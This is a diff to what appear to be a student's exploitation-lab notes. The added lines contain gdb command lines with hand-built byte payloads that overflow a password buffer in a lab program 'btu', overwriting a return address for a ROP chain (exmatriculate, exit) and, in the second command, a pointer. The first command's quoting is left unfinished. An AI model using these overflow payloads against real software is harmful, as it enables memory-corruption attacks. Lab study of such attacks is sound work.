@@ -12,3 +12,28 @@ reduced to detecting whether the guard is overwritten. These two problems seem L
 but they are not. By looking at the value of the return address, we do not know whether its value 
 is modi fied or not, but since the value of the guard is placed by us, it is easy to know whether 
 the guard 's value is modified or not.
+
+# Martin code: 
+
+```bash
+gdb --args ./build/bin/btu add Martin "$(python3 -c 'import sys; sys.stdout.buffer.write(
+    b"\x66\xb1\x04\x08" +  # exmatriculate() address
+    b"\xb0\x25\xb1\xf7" +  # exit() address
+    b"\x60\x0c\x05\x08" +  # this pointer (btu)
+    b"\xff\x1c\x45\x6a"    # student ID (Klaus)
+)')" 222 "$(python3 -c 'import sys; sys.stdout.buffer.write(
+    b"\x90"*32 +           # NOP sled to fill password buffer (32 bytes)
+    b"DDDD" +              # filler for next 4 bytes after buffer
+    b"\x6c\xcb\xff\xff"    # return address overwrite (points to last_name ROP chain)
+```
+
+## My Command: 
+gdb --args ./build/bin/btu add Zuzzz \
+"$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xef\xbe\xad\xde")')" \
+222 \
+"$(python3 -c 'import sys; sys.stdout.buffer.write(
+    b"A"*32 +              # Fill password buffer
+    b"BBBB" +              # Filler
+    b"\xcd\xab\xff\xff"    # Overwrite last_name pointer → 0xFFFFABCD
+)')"
+qq
